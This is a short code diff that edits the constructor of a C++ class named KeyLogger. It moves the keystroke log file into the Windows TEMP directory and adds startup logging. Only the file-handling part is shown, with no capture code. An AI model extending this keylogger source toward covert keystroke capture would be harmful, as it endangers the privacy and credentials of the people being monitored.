@@ -18,10 +18,23 @@ private:
 
 public:
   KeyLogger() : running(true), logFile(nullptr) {
-    // Initialize file logging
-    logFile = fopen("keylog.txt", "a");
+    // Initialize file logging and put the file in the temp directory
+    const char* tempPath = getenv("TEMP");
+    if (tempPath) {
+        std::string filePath = std::string(tempPath) + "\\keylog.txt";
+        logFile = fopen(filePath.c_str(), "w");
+    } else {
+        spdlog::error("Failed to get TEMP environment variable");
+    }
+    
     if (!logFile) {
       spdlog::error("Failed to open log file");
+    }
+
+    if (logFile) {
+      spdlog::info("Keylogger started");
+    } else {
+      spdlog::error("Keylogger failed to start");
     }
   }
 
